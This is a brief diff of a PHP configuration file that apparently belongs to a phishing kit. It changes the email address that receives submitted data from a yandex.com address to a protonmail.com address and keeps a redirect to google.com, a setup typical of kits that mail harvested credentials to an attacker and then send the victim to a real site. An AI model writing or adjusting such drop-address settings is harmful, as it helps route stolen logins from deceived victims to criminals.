@@ -1,4 +1,4 @@
 <?php 
-$Receive_email="expirogold@yandex.com";
+$Receive_email="ziggergold@protonmail.com";
 $redirect="https://www.google.com/";
 ?>
